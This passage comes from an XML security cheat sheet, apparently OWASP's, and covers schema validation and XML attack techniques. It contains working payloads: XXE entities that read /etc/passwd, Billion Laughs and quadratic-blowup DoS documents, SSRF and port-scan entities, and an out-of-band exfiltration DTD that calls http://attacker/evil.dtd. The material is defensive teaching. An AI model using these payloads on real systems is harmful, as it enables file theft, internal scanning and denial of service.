name= \"quantity\" type= \"xs:positiveInteger\" /> </xs:sequence> </xs:complexType> </xs:element> </xs:schema> The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed. General Data Restrictions \u00b6 After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid: Prefixed Values \u00b6 Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect whitelist scenario for an application: only specific values will be accepted. Such a constraint is called enumeration in XML schema. The following example restricts the contents of the element month to 12 possible values: <xs:element name= \"month\" > <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:enumeration value= \"January\" /> <xs:enumeration value= \"February\" /> <xs:enumeration value= \"March\" /> <xs:enumeration value= \"April\" /> <xs:enumeration value= \"May\" /> <xs:enumeration value= \"June\" /> <xs:enumeration value= \"July\" /> <xs:enumeration value= \"August\" /> <xs:enumeration value= \"September\" /> <xs:enumeration value= \"October\" /> <xs:enumeration value= \"November\" /> <xs:enumeration value= \"December\" /> </xs:restriction> </xs:simpleType> </xs:element> By limiting the month element's value to any of the previous values, the application will not be manipulating random strings. Ranges \u00b6 Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios: <xs:element name= \"name\" > <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:minLength value= \"3\" /> <xs:maxLength value= \"256\" /> </xs:restriction> </xs:simpleType> </xs:element> In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid: <xs:element name= \"name\" > <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:length value= \"8\" /> </xs:restriction> </xs:simpleType> </xs:element> Patterns \u00b6 Certain elements or attributes may follow a specific syntax. You can add pattern restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific pattern : <xs:element name= \"SSN\" > <xs:simpleType> <xs:restriction base= \"xs:token\" > <xs:pattern value= \"[0-9]{3}-[0-9]{2}-[0-9]{4}\" /> </xs:restriction> </xs:simpleType> </xs:element> Only numbers between 000-00-0000 and 999-99-9999 will be allowed as values for a SSN. Assertions \u00b6 Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable $value can be used to reference the contents of the value being analyzed. The Divide by Zero section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an assertion disallowing the number zero: <xs:element name= \"denominator\" > <xs:simpleType> <xs:restriction base= \"xs:integer\" > <xs:assertion test= \"$value != 0\" /> </xs:restriction> </xs:simpleType> </xs:element> The assertion guarantees that the denominator will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator. Occurrences \u00b6 The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: minOccurs and maxOccurs . The default value for both the minOccurs and the maxOccurs attributes is 1 , but certain elements may require other values. For instance, if a value is optional, it could contain a minOccurs of 0, and if there is no limit on the maximum amount, it could contain a maxOccurs of unbounded , as in the following example: <xs:schema xmlns:xs= \"http://www.w3.org/2001/XMLSchema\" > <xs:element name= \"operation\" > <xs:complexType> <xs:sequence> <xs:element name= \"buy\" maxOccurs= \"unbounded\" > <xs:complexType> <xs:all> <xs:element name= \"id\" type= \"xs:integer\" /> <xs:element name= \"price\" type= \"xs:decimal\" /> <xs:element name= \"quantity\" type= \"xs:integer\" /> </xs:all> </xs:complexType> </xs:element> </xs:complexType> </xs:element> </xs:schema> The previous schema includes a root element named operation , which can contain an unlimited ( unbounded ) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an unbounded value. Jumbo Payloads \u00b6 Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests. Traditional Jumbo Payloads \u00b6 There are two primary methods to make a document larger than normal: Depth attack: using a huge number of elements, element names, and/or element values. Width attack: using a huge number of attributes, attribute names, and/or attribute values. In most cases, the overall result will be a huge document. This is a short example of what this looks like: <SOAPENV:ENVELOPE XMLNS:SOAPENV= \"HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/\" XMLNS:EXT= \"HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL\" > <SOAPENV:HEADER LARGENAME1= \"LARGEVALUE\" LARGENAME2= \"LARGEVALUE2\" LARGENAME3= \"LARGEVALUE3\" \u2026 > ... \"Small\" Jumbo Payloads \u00b6 The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources: <?xml version=\"1.0\"?> <!DOCTYPE root [ <!ENTITY file SYSTEM \"http://attacker/huge.xml\" > ]> <root> &file; </root> Schema Poisoning \u00b6 When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using DTD (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema. Local Schema Poisoning \u00b6 Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document . Embedded Schema \u00b6 The most trivial type of schema poisoning takes place when the schema is defined within the same XML document. Consider the following, unknowingly vulnerable example provided by the W3C : <?xml version=\"1.0\"?> <!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]> <note> <to> Tove </to> <from> Jani </from> <heading> Reminder </heading> <body> Don't forget me this weekend </body> </note> All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contains a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks. Incorrect Permissions \u00b6 You can often circumvent the risk of using remotely tampered versions by processing a local schema. <!DOCTYPE note SYSTEM \"note.dtd\"> <note> <to> Tove </to> <from> Jani </from> <heading> Reminder </heading> <body> Don't forget me this weekend </body> </note> However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications: -rw-rw-rw- 1 user staff 743 Jan 15 12:32 note.dtd The permissions set on name.dtd allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem. Remote Schema Poisoning \u00b6 Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended. Man-in-the-Middle (MitM) Attack \u00b6 When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user: <!DOCTYPE note SYSTEM \"http://example.com/note.dtd\"> <note> <to> Tove </to> <from> Jani </from> <heading> Reminder </heading> <body> Don't forget me this weekend </body> </note> The remote file note.dtd could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy . DNS-Cache Poisoning \u00b6 Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses. The previous example referenced the host example.com using an unencrypted protocol. When switching to HTTPS, the location of the remote schema will look like https://example/note.dtd . In a normal scenario, the IP of example.com resolves to 1.1.1.1 : $ host example.com example.com has address 1 .1.1.1 If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker 2.2.2.2 : $ host example.com example.com has address 2 .2.2.2 When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker. Evil Employee Attack \u00b6 When third parties host and define schemas, the contents are not under the control of the schemas' users. Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is DTD ). XML Entity Expansion \u00b6 If the parser uses a DTD , an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files. Sample Vulnerable Java Implementations \u00b6 Using the DTD capabilities of referencing local or remote files it is possible to affect the confidentiality. In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE. Sample XML : <!DOCTYPE contacts SYSTEM \"contacts.dtd\"> <contacts> <contact> <firstname> John </firstname> <lastname> &xxe; </lastname> </contact> </contacts> Sample DTD : <!ELEMENT contacts (contact*)> <!ELEMENT contact (firstname,lastname)> <!ELEMENT firstname (#PCDATA)> <!ELEMENT lastname ANY> <!ENTITY xxe SYSTEM \"/etc/passwd\"> XXE using DOM \u00b6 import java.io.IOException ; import javax.xml.parsers.DocumentBuilder ; import javax.xml.parsers.DocumentBuilderFactory ; import javax.xml.parsers.ParserConfigurationException ; import org.xml.sax.InputSource ; import org.w3c.dom.Document ; import org.w3c.dom.Element ; import org.w3c.dom.Node ; import org.w3c.dom.NodeList ; public class parseDocument { public static void main ( String [] args ) { try { DocumentBuilderFactory factory = DocumentBuilderFactory . newInstance (); DocumentBuilder builder = factory . newDocumentBuilder (); Document doc = builder . parse ( new InputSource ( \"contacts.xml\" )); NodeList nodeList = doc . getElementsByTagName ( \"contact\" ); for ( int s = 0 ; s < nodeList . getLength (); s ++ ) { Node firstNode = nodeList . item ( s ); if ( firstNode . getNodeType () == Node . ELEMENT_NODE ) { Element firstElement = ( Element ) firstNode ; NodeList firstNameElementList = firstElement . getElementsByTagName ( \"firstname\" ); Element firstNameElement = ( Element ) firstNameElementList . item ( 0 ); NodeList firstName = firstNameElement . getChildNodes (); System . out . println ( \"First Name: \" + (( Node ) firstName . item ( 0 )). getNodeValue ()); NodeList lastNameElementList = firstElement . getElementsByTagName ( \"lastname\" ); Element lastNameElement = ( Element ) lastNameElementList . item ( 0 ); NodeList lastName = lastNameElement . getChildNodes (); System . out . println ( \"Last Name: \" + (( Node ) lastName . item ( 0 )). getNodeValue ()); } } } catch ( Exception e ) { e . printStackTrace (); } } } The previous code produces the following output: $ javac parseDocument.java ; java parseDocument First Name: John Last Name: ### User Database ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh XXE using DOM4J \u00b6 import org.dom4j.Document ; import org.dom4j.DocumentException ; import org.dom4j.io.SAXReader ; import org.dom4j.io.OutputFormat ; import org.dom4j.io.XMLWriter ; public class test1 { public static void main ( String [] args ) { Document document = null ; try { SAXReader reader = new SAXReader (); document = reader . read ( \"contacts.xml\" ); } catch ( Exception e ) { e . printStackTrace (); } OutputFormat format = OutputFormat . createPrettyPrint (); try { XMLWriter writer = new XMLWriter ( System . out , format ); writer . write ( document ); } catch ( Exception e ) { e . printStackTrace (); } } } The previous code produces the following output: $ java test1 <?xml version = \"1.0\" encoding = \"UTF-8\" ?> <!DOCTYPE contacts SYSTEM \"contacts.dtd\" > <contacts> <contact> <firstname>John</firstname> <lastname>### User Database ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh XXE using SAX \u00b6 import java.io.IOException ; import javax.xml.parsers.SAXParser ; import javax.xml.parsers.SAXParserFactory ; import org.xml.sax.SAXException ; import org.xml.sax.helpers.DefaultHandler ; public class parseDocument extends DefaultHandler { public static void main ( String [] args ) { new parseDocument (); } public parseDocument () { try { SAXParserFactory factory = SAXParserFactory . newInstance (); SAXParser parser = factory . newSAXParser (); parser . parse ( \"contacts.xml\" , this ); } catch ( Exception e ) { e . printStackTrace (); } } @Override public void characters ( char [] ac , int i , int j ) throws SAXException { String tmpValue = new String ( ac , i , j ); System . out . println ( tmpValue ); } } The previous code produces the following output: $ java parseDocument John #### User Database ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh XXE using StAX \u00b6 import javax.xml.parsers.SAXParserFactory ; import javax.xml.stream.XMLStreamReader ; import javax.xml.stream.XMLInputFactory ; import java.io.File ; import java.io.FileReader ; import java.io.FileInputStream ; public class parseDocument { public static void main ( String [] args ) { try { XMLInputFactory xmlif = XMLInputFactory . newInstance (); FileReader fr = new FileReader ( \"contacts.xml\" ); File file = new File ( \"contacts.xml\" ); XMLStreamReader xmlfer = xmlif . createXMLStreamReader ( \"contacts.xml\" , new FileInputStream ( file )); int eventType = xmlfer . getEventType (); while ( xmlfer . hasNext ()) { eventType = xmlfer . next (); if ( xmlfer . hasText ()){ System . out . print ( xmlfer . getText ()); } } fr . close (); } catch ( Exception e ) { e . printStackTrace (); } } } The previous code produces the following output: $ java parseDocument <!DOCTYPE contacts SYSTEM \"contacts.dtd\" >John### User Database ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh Recursive Entity Reference \u00b6 When the definition of an element A is another element B , and that element B is defined as element A , that schema describes a circular reference between elements: <!DOCTYPE A [ <!ELEMENT A ANY> <!ENTITY A \"<A> &B; </A> \"> <!ENTITY B \"&A;\"> ]> <A> &A; </A> Quadratic Blowup \u00b6 Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (O(n2)) . The result of the following attack will be 100,000 x 100,000 characters in memory. <!DOCTYPE root [ <!ELEMENT root ANY> <!ENTITY A \"AAAAA...(a 100.000 A's)...AAAAA\"> ]> <root> &A;&A;&A;&A; ...(a 100.000 &A; 's)... &A;&A;&A;&A;&A; </root> Billion Laughs \u00b6 When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded DTD schema including the attack: <!DOCTYPE root [ <!ELEMENT root ANY> <!ENTITY LOL \"LOL\"> <!ENTITY LOL1 \"&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;\"> <!ENTITY LOL2 \"&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;\"> <!ENTITY LOL3 \"&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;\"> <!ENTITY LOL4 \"&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;\"> <!ENTITY LOL5 \"&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;\"> <!ENTITY LOL6 \"&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;\"> <!ENTITY LOL7 \"&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;\"> <!ENTITY LOL8 \"&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;\"> <!ENTITY LOL9 \"&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;\"> ]> <root> &LOL9; </root> The entity LOL9 will be resolved as the 10 entities defined in LOL8 ; then each of these entities will be resolved in LOL7 and so on. Finally, the CPU and/or memory will be affected by parsing the 3 x 10^9 (3,000,000,000) entities defined in this schema, which could make the parser crash. The Simple Object Access Protocol ( SOAP ) specification forbids DTD s completely. This means that a SOAP processor can reject any SOAP message that contains a DTD . Despite this specification, certain SOAP implementations did parse DTD schemas within SOAP messages. The following example illustrates a case where the parser is not following the specification, enabling a reference to a DTD in a SOAP message: <?XML VERSION=\"1.0\" ENCODING=\"UTF-8\"?> <!DOCTYPE SOAP-ENV:ENVELOPE [ <!ELEMENT SOAP-ENV:ENVELOPE ANY> <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED> <!ENTITY LOL \"LOL\"> <!ENTITY LOL1 \"&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;\"> <!ENTITY LOL2 \"&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;\"> <!ENTITY LOL3 \"&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;\"> <!ENTITY LOL4 \"&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;\"> <!ENTITY LOL5 \"&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;\"> <!ENTITY LOL6 \"&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;\"> <!ENTITY LOL7 \"&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;\"> <!ENTITY LOL8 \"&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;\"> <!ENTITY LOL9 \"&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;\"> ]> <SOAP:ENVELOPE ENTITYREFERENCE= \"&LOL9;\" XMLNS:SOAP= \"HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/\" > <SOAP:BODY> <KEYWORD XMLNS= \"URN:PARASOFT:WS:STORE\" > FOO </KEYWORD> </SOAP:BODY> </SOAP:ENVELOPE> Reflected File Retrieval \u00b6 Consider the following example code of an XXE: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE root [ <!ELEMENT includeme ANY> <!ENTITY xxe SYSTEM \"/etc/passwd\"> ]> <root> &xxe; </root> The previous XML defines an entity named xxe , which is in fact the contents of /etc/passwd , which will be expanded within the includeme tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output. Server Side Request Forgery \u00b6 Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file, a file via HTTP/HTTPS/FTP, etc. SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks. External DNS Resolution \u00b6 Sometimes is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack. <!DOCTYPE m PUBLIC \"-//B/A/EN\" \"http://checkforthisspecificdomain.example.com\"> External Connection \u00b6 Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE root [ <!ENTITY % xxe SYSTEM \"http://attacker/evil.dtd\"> %xxe; ]> File Retrieval with Parameter Entities \u00b6 Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document: <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE root [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://attacker/evil.dtd\"> %dtd; ]> <root> &send; </root> Here the DTD defines two external parameter entities: file loads a local file, and dtd which loads a remote DTD . The remote DTD should contain something like this: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!ENTITY % all \"<!ENTITY send SYSTEM 'http://example.com/?%file;'> \"> %all; The second DTD causes the system to send the contents of the file back to the attacker's server as a parameter of the URL. Port Scanning \u00b6 The amount and type of information will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex: 1) Complete Disclosure : The simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host. 2) Error-based : If you are unable to see the response from the remote server, you may be able to use the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection: java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459) at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674) 3) Timeout-based : Timeouts could occur when connecting to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear. 4) Time-based : Sometimes differences between closed and open ports are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host; then analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish when performed in higher latency networks. Brute Forcing \u00b6 Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the username and password as part of the URI scheme (http, ftp, etc). For example the following : <!DOCTYPE root [ <!ENTITY user SYSTEM \"http://username:password@example.com:8080\"> ]> <root> &user; </root>","title":"XML Security"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#xml-security-cheat-sheet","text":"","title":"XML Security Cheat Sheet"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#introduction","text":"Specifications for XML and XML schemas include multiple security flaws. At the same time, these specifications provide the tools required to protect XML applications. Even though we use XML schemas to define the security of XML documents, they can be used to perform a variety of attacks: file retrieval, server side request forgery, port scanning, or brute forcing. This cheat sheet exposes how to exploit the different possibilities in libraries and software divided in two sections: Malformed XML Documents : vulnerabilities using not well formed documents. Invalid XML Documents : vulnerabilities using documents that do not have the expected structure.","title":"Introduction"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#malformed-xml-documents","text":"The W3C XML specification defines a set of principles that XML documents must follow to be considered well formed. When a document violates any of these principles, it must be considered a fatal error and the data it contains is considered malformed. Multiple tactics will cause a malformed document: removing an ending tag, rearranging the order of elements into a nonsensical structure, introducing forbidden characters, and so on. The XML parser should stop execution once detecting a fatal error. The document should not undergo any additional processing, and the application should display an error message. The recommendation to avoid these vulnerabilities are to use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents. In addition, use only well-formed documents and validate the contents of each element and attribute to process only valid values within predefined boundaries.","title":"Malformed XML Documents"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#more-time-required","text":"A malformed document may affect the consumption of Central Processing Unit (CPU) resources. In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS). To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document. Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.","title":"More Time Required"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#applications-processing-malformed-data","text":"Certain XML parsers have the ability to recover malformed documents. They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. Since there are no predefined rules for the recovery process, the approach and results may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity. The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:","title":"Applications Processing Malformed Data"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#malformed-document-to-malformed-document","text":"According to the XML specification, the string -- (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered: <element> <!-- one <!-- another comment comment --> </element>","title":"Malformed Document to Malformed Document"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#well-formed-document-to-well-formed-document-normalized","text":"Certain parsers may consider normalizing the contents of your CDATA sections. This means that they will update the special characters contained in the CDATA section to contain the safe versions of these characters even though is not required: <element> <![CDATA[<script>a=1;</script>]]> </element> Normalization of a CDATA section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation: <element> &lt; script &gt; a=1; &lt; /script &gt; </element>","title":"Well-Formed Document to Well-Formed Document Normalized"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#coercive-parsing","text":"A coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this: <A1> <A2> <A3> ... <A30000>","title":"Coercive Parsing"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#violation-of-xml-specification-rules","text":"Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.","title":"Violation of XML Specification Rules"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#invalid-xml-documents","text":"Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values. Schemas specify restrictions that help identify whether documents are valid. A valid document is well formed and complies with the restrictions of a schema, and more than one schema can be used to validate a document. These restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages. The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not DTD ) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.","title":"Invalid XML Documents"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#document-without-schema","text":"Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an id value related to an item and a certain price . The user may only introduce a certain id value using the web interface: <buy> <id> 123 </id> <price> 10 </price> </buy> If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents: <buy> <id> 123 </id><price> 0 </price><id></id> <price> 10 </price> </buy> Notice again how the value 123 is supplied as an id , but now the document includes additional opening and closing tags. The attacker closed the id element and sets a bogus price element to the value 0. The final step to keep the structure well-formed is to add one empty id element. After this, the application adds the closing tag for id and set the price to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.","title":"Document without Schema"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#unrestrictive-schema","text":"Certain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using DTD ; it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's age is validated against an inline DTD schema: <!DOCTYPE person [ <!ELEMENT person (name, age)> <!ELEMENT name (#PCDATA)> <!ELEMENT age (#PCDATA)> ]> <person> <name> John Doe </name> <age> 11111..(1.000.000digits)..11111 </age> </person> The previous document contains an inline DTD with a root element named person . This element contains two elements in a specific order: name and then age . The element name is then defined to contain PCDATA as well as the element age . After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the age element contains one million digits. Since there are no restrictions on the maximum size for the age element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element name or a valid range for the element age ), this type of schema increases the risk of affecting the integrity and availability of resources.","title":"Unrestrictive Schema"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#improper-data-validation","text":"When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.","title":"Improper Data Validation"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#string-data-types","text":"Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look: <element name= \"CipherData\" type= \"xenc:CipherDataType\" /> <complexType name= \"CipherDataType\" > <choice> <element name= \"CipherValue\" type= \"base64Binary\" /> <element ref= \"xenc:CipherReference\" /> </choice> </complexType> The previous schema defines the element CipherValue as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the CipherData element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.","title":"String Data Types"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#numeric-data-types","text":"Defining the correct data type for numbers can be more complex since there are more options than there are for strings.","title":"Numeric Data Types"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#negative-and-positive-restrictions","text":"XML Schema 